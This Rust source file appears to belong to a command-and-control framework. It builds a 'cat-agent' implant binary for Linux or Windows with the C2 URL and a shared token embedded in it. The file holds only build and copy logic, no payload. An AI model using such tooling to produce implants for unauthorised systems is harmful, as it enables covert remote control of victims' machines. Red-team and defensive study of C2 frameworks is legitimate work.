//! Agent binary build (embed config, cargo build, copy output).

use std::fs;
use std::path::{Path, PathBuf};
use std::str::FromStr;

use anyhow::{anyhow, Result};

#[derive(Debug, Clone, serde::Serialize, serde::Deserialize)]
pub struct AgentBuildConfig {
    pub c2_url: String,
    pub profile_name: String,
    pub shared_token: String,
    pub alias: String,
    pub note: Option<String>,
}

#[derive(Debug, Clone, Copy)]
pub enum Os {
    Linux,
    Windows,
}

impl FromStr for Os {
    type Err = String;
    fn from_str(s: &str) -> Result<Self, Self::Err> {
        let lower = s.to_lowercase();
        match lower.as_str() {
            "linux" => Ok(Os::Linux),
            "windows" | "win" | "win32" | "win64" => Ok(Os::Windows),
            other => Err(format!("unsupported os: {other} (use: linux | windows)")),
        }
    }
}

#[derive(Debug)]
pub struct BuildAgentArgs {
    pub os: Os,
    pub alias: String,
    pub c2_url: String,
    pub profile: String,
    pub shared_token: String,
    pub output_dir: PathBuf,
    pub name: String,
    pub note: Option<String>,
}

fn workspace_root() -> PathBuf {
    let cli_dir = Path::new(env!("CARGO_MANIFEST_DIR"));
    cli_dir
        .parent()
        .expect("no parent for CARGO_MANIFEST_DIR")
        .to_path_buf()
}

pub fn build_agent(args: BuildAgentArgs) -> Result<()> {
    let root = workspace_root();

    let cfg = AgentBuildConfig {
        c2_url: args.c2_url.clone(),
        profile_name: args.profile.clone(),
        shared_token: args.shared_token.clone(),
        alias: args.alias.clone(),
        note: args.note.clone(),
    };
    let cfg_json = serde_json::to_string(&cfg)?;

    let (target_arg, bin_path): (Option<&str>, PathBuf) = match args.os {
        Os::Linux => (None, root.join("target").join("release").join("cat-agent")),
        Os::Windows => (
            Some("x86_64-pc-windows-gnu"),
            root.join("target")
                .join("x86_64-pc-windows-gnu")
                .join("release")
                .join("cat-agent.exe"),
        ),
    };

    println!(
        "[build-agent] starting cargo build for cat-agent (os={:?}, alias={})...",
        args.os, args.alias
    );

    let mut cmd = std::process::Command::new("cargo");
    cmd.current_dir(&root)
        .env("CLOAKCAT_EMBED_CONFIG", &cfg_json)
        .arg("build")
        .arg("-p")
        .arg("cat-agent")
        .arg("--bin")
        .arg("cat-agent")
        .arg("--release")
        .stdout(std::process::Stdio::inherit())
        .stderr(std::process::Stdio::inherit());
    if let Some(triple) = target_arg {
        cmd.arg("--target").arg(triple);
    }
    let status = cmd.status()?;
    if !status.success() {
        eprintln!("[build-agent] cargo build failed with status: {}", status);
        return Err(anyhow!("cargo build failed"));
    }

    println!("[build-agent] cargo build finished, locating binary...");
    if !bin_path.exists() {
        eprintln!(
            "[build-agent] built binary not found at {}",
            bin_path.display()
        );
        return Err(anyhow!(
            "built binary not found (check target toolchain and build output)"
        ));
    }

    fs::create_dir_all(&args.output_dir)?;
    let mut dest = args.output_dir.join(&args.name);
    if matches!(args.os, Os::Windows)
        && !dest.to_string_lossy().to_lowercase().ends_with(".exe")
    {
        dest.set_extension("exe");
    }
    fs::copy(&bin_path, &dest)?;
    println!("[build-agent] done. saved agent binary to {}", dest.display());
    Ok(())
}
